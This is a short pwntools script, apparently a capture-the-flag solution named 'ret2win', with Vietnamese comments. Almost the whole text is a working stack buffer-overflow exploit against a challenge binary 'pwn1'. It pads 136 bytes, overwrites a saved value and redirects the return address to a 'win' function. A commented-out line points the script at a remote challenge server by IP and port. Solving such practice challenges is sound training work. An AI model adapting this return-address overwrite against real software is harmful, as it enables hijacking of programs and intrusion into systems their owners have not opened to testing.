#ret2win
from pwn import *

p = process("./pwn1")   
# p = remote("14.225.255.41", 13331)

payload = b"a"*136
payload += p64(0xDEADBEEF) #chuyen chuoi hex sang 8 bytes

win = 0x000000000040130c #dia chi ham win
payload += p64(win)

p.sendlineafter(b"Enter your name: ", payload)
p.interactive()